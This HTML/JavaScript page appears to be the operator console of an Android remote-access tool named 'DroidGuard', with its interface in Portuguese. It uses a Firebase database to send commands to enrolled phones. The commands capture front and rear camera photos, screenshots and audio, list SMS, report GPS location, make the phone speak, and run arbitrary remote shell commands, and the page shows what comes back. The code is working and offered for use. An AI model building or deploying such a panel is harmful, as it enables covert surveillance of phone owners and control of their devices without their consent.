<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DroidGuard</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <style>
        body { background: #0a0c0f; color: #eef2ff; font-family: monospace; padding: 20px; }
        button { background: #2f8e8b; padding: 12px 24px; margin: 8px; border: none; color: white; border-radius: 8px; cursor: pointer; font-size: 14px; }
        button:hover { background: #3fa39f; transform: scale(1.02); }
        .card { background: #0f1219; border-radius: 16px; padding: 20px; margin-bottom: 20px; border: 1px solid #1e2a36; }
        pre { background: #1a1f2a; padding: 15px; border-radius: 8px; overflow: auto; max-height: 300px; }
        .online { color: #2ecc71; }
        select, input { background: #1e2a36; border: none; padding: 10px; border-radius: 8px; color: white; margin: 5px; }
        .result-img { max-width: 100%; border-radius: 8px; margin-top: 10px; }
        audio { width: 100%; margin-top: 10px; }
    </style>
</head>
<body>
    <h1>🛡️ DroidGuard</h1>
    
    <div class="card">
        <h3>📱 Dispositivo</h3>
        <select id="deviceSelect" onchange="selectDevice()">
            <option value="">Carregando...</option>
        </select>
        <button onclick="refreshDevices()">🔄 Atualizar</button>
        <span id="deviceStatus"></span>
    </div>

    <div class="card">
        <h3>📸 Comandos</h3>
        <button onclick="sendCmd('bateria')">🔋 Bateria</button>
        <button onclick="sendCmd('vibrar')">📳 Vibrar</button>
        <button onclick="sendCmd('gps')">📍 GPS</button>
        <button onclick="sendCmd('foto_frontal')">📷 Foto Frontal</button>
        <button onclick="sendCmd('foto_traseria')">📷 Foto Traseira</button>
        <button onclick="sendCmd('screenshot')">📸 Screenshot</button>
        <button onclick="sendCmd('gravar_audio', {duracao:5})">🎤 Áudio 5s</button>
        <button onclick="sendCmd('listar_sms')">📨 SMS</button>
        <button onclick="abrirFalar()">🗣️ Falar</button>
    </div>

    <div class="card">
        <h3>💻 Shell Remoto</h3>
        <input type="text" id="shellCmd" placeholder="Comando..." style="width: 70%;">
        <button onclick="execShell()">Executar</button>
    </div>

    <div class="card">
        <h3>📋 Resultado</h3>
        <pre id="resultado">Aguardando comandos...</pre>
    </div>

    <div id="modalFalar" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:#1a1f2a; padding:30px; border-radius:16px;">
        <h3>🗣️ Falar</h3>
        <input type="text" id="textoFalar" style="width:100%;">
        <button onclick="sendCmd('falar', {texto: document.getElementById('textoFalar').value}); fecharFalar()">Enviar</button>
        <button onclick="fecharFalar()">Cancelar</button>
    </div>

    <script>
        let currentDevice = null;
        let autoRefresh = null;

        const firebaseConfig = { databaseURL: "https://droidguard-10597-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        function refreshDevices() {
            db.ref('dispositivos').once('value', (snap) => {
                const devices = snap.val() || {};
                const select = document.getElementById('deviceSelect');
                select.innerHTML = '<option value="">Selecione...</option>';
                for(let id in devices) {
                    const d = devices[id];
                    const status = d.status === 'online' ? '🟢' : '🔴';
                    select.innerHTML += `<option value="${id}">${status} ${id}</option>`;
                }
                
                // Se tem dispositivo e nenhum selecionado, auto-seleciona
                if(!currentDevice && Object.keys(devices).length > 0) {
                    currentDevice = Object.keys(devices)[0];
                    select.value = currentDevice;
                    selectDevice();
                }
            });
        }

        function selectDevice() {
            currentDevice = document.getElementById('deviceSelect').value;
            if(currentDevice) {
                db.ref(`dispositivos/${currentDevice}`).on('value', (snap) => {
                    const d = snap.val();
                    if(d) {
                        const statusSpan = document.getElementById('deviceStatus');
                        statusSpan.innerHTML = d.status === 'online' ? '<span class="online">🟢 Online</span>' : '🔴 Offline';
                    }
                });
            }
        }

        async function sendCmd(acao, params = {}) {
            if(!currentDevice) {
                document.getElementById('resultado').innerText = '❌ Selecione um dispositivo primeiro!';
                refreshDevices();
                return;
            }
            
            const cmdId = Date.now().toString();
            document.getElementById('resultado').innerText = `🔄 Enviando ${acao}...`;
            
            await db.ref(`comandos/${currentDevice}/${cmdId}`).set({ acao, params, timestamp: Date.now() });
            
            const resultRef = db.ref(`resultados/${currentDevice}/${cmdId}`);
            resultRef.once('value', (snap) => {
                const res = snap.val();
                if(res) {
                    if(res.foto) {
                        document.getElementById('resultado').innerHTML = `<img src="data:image/jpeg;base64,${res.foto}" class="result-img">`;
                    } else if(res.screen) {
                        document.getElementById('resultado').innerHTML = `<img src="data:image/png;base64,${res.screen}" class="result-img">`;
                    } else if(res.audio) {
                        document.getElementById('resultado').innerHTML = `<audio controls src="data:audio/aac;base64,${res.audio}"></audio>`;
                    } else {
                        document.getElementById('resultado').innerText = JSON.stringify(res, null, 2);
                    }
                } else {
                    document.getElementById('resultado').innerText = '⏳ Aguardando resposta do dispositivo...';
                }
            });
            
            setTimeout(() => resultRef.off(), 20000);
        }

        function execShell() {
            const cmd = document.getElementById('shellCmd').value;
            if(cmd) sendCmd('shell', { cmd: cmd });
        }

        function abrirFalar() { document.getElementById('modalFalar').style.display = 'block'; }
        function fecharFalar() { document.getElementById('modalFalar').style.display = 'none'; }

        refreshDevices();
        setInterval(refreshDevices, 5000);
    </script>
</body>
</html>
